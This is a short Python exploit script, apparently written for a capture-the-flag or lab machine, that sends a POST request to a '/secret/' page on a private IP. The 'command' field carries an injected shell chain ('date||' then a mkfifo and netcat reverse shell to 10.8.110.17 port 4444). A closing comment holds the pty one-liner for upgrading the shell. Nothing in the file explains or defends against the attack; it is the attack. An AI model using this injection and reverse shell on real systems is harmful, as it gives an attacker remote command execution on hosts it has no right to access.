#!/usr/bin/env python3

import requests as r
import json

IP = "10.10.46.228"
URL = "http://{}/secret/".format(IP)
COMMAND = {"command" : "date||rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.8.110.17 4444 >/tmp/f"}

response = r.post(URL, data=COMMAND)
print(response.text)

# python3 -c 'import pty;pty.spawn("/bin/bash")'